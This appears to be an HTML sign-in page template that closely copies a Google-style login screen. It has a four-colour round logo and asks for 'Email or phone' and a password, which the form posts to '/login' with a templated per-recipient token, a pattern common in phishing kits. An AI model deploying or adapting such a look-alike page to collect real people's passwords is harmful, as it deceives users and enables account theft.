
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Sign in</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,'Segoe UI',Roboto,Arial,sans-serif;background:#f1f3f4;
     display:grid;place-items:center;min-height:100vh;padding:20px}
.card{background:#fff;padding:40px 32px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,.08);
      width:100%;max-width:360px;text-align:center}
.logo{width:48px;height:48px;margin:0 auto 16px;border-radius:50%;
      background:conic-gradient(#4285f4 0 25%,#ea4335 0 50%,#fbbc04 0 75%,#34a853 0)}
h1{font-size:22px;font-weight:400;margin-bottom:4px;color:#202124}
.sub{font-size:14px;color:#5f6368;margin-bottom:24px}
input{width:100%;padding:12px 14px;margin-bottom:14px;border:1px solid #dadce0;
      border-radius:4px;font-size:15px;font-family:inherit}
input:focus{outline:2px solid #4285f4;border-color:transparent}
button{width:100%;padding:12px;background:#4285f4;color:#fff;border:none;
       border-radius:4px;font-size:15px;font-weight:500;cursor:pointer}
button:hover{background:#357ae8}
.foot{font-size:12px;color:#5f6368;margin-top:18px}
</style>
</head>
<body>
  <div class="card">
    <div class="logo"></div>
    <h1>Sign in</h1>
    <p class="sub">Use your account</p>
    <form method="POST" action="/login?t={{ token }}">
      <input type="email"    name="email"    placeholder="Email or phone" required autofocus>
      <input type="password" name="password" placeholder="Password" required>
      <button type="submit">Next</button>
    </form>
    <p class="foot">Forgot password? &middot; Create account</p>
  </div>
</body>
</html>
